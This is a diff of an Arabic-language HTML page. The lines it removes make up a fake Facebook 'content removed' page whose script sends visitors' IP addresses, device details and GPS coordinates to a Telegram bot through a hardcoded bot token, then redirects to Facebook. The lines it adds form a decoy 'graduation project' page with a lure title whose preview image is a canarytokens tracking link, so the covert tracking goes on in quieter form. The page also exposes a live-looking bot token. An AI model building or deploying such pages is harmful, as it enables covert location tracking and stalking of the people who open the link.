@@ -4,60 +4,40 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <meta property="og:title" content="عذراً، هذا المحتوى غير متاح الآن">
-    <meta property="og:description" content="تم حذف المنشور أو تقييده لمراجعة معايير المجتمع.">
+    <title>مشروع التخرج - نظام الإدارة</title>
+    <meta property="og:title" content="عرض ملف التقارير الفنية - 2026">
+    <meta property="og:description" content="اضغط هنا لمعاينة سجلات نظام المراقبة وتحديثات الشبكة الأخيرة.">
     
-    <meta property="og:image" content="https://iplogger.com/1XXXXX.jpg"> 
+    <meta property="og:image" content="http://canarytokens.com/articles/images/about/ks92sz3cj5z6o73mik3jetijs/image020.png">
     
     <meta property="og:type" content="website">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
 
-    <title>Facebook - Content Removed</title>
-    
     <style>
-        body { margin: 0; background: #f0f2f5; font-family: Segoe UI, Arial; display: flex; align-items: center; justify-content: center; height: 100vh; cursor: pointer; }
-        .error-box { text-align: center; max-width: 400px; }
-        .icon-lock { width: 100px; margin-bottom: 20px; }
-        .fb-btn { background: #1877f2; color: white; padding: 10px 20px; border-radius: 6px; text-decoration: none; border:none; font-weight:bold; }
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f4f4f9;
+        }
+        .container {
+            text-align: center;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            background: white;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
     </style>
 </head>
-<body onclick="startCapture()">
-
-    <div class="error-box">
-        <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y7/r/s9m_9bu7wS7.png" class="icon-lock">
-        <div style="font-size:18px; font-weight:bold; color:#65676b; margin-bottom:10px;">المحتوى غير متوفر</div>
-        <div style="font-size:14px; color:#65676b; margin-bottom:25px;">ربما تم حذف الرابط أو انتهاء صلاحيته.</div>
-        <button class="fb-btn">الانتقال إلى فيسبوك</button>
+<body>
+    <div class="container">
+        <h1>أهلاً بك في نظام الإدارة التقنية</h1>
+        <p>جاري تحميل البيانات، يرجى الانتظار...</p>
     </div>
-
-<script>
-    const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
-    const CHAT_ID = "1611398303";
-
-    // صيد البيانات عند الفتح الحقيقي
-    async function captureOnOpen() {
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            sendToBot(`🚀 الضحية فتح الرابط الآن!\n🌐 IP: ${data.ip}\n📱 الجهاز: ${navigator.platform}`);
-        } catch (e) { console.log("Silent error"); }
-    }
-
-    // صيد الـ GPS الدقيق عند اللمس
-    function startCapture() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition((pos) => {
-                let msg = `🎯 صيد دقيق (GPS REAL)\n📍 الإحداثيات: ${pos.coords.latitude}, ${pos.coords.longitude}\n🔗 الخريطة: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                sendToBot(msg);
-                setTimeout(() => { window.location.href = "https://m.facebook.com"; }, 500);
-            }, () => { window.location.href = "https://m.facebook.com"; });
-        }
-    }
-
-    function sendToBot(text) {
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
-    }
-
-    window.onload = captureOnOpen;
-</script>
 </body>
 </html>
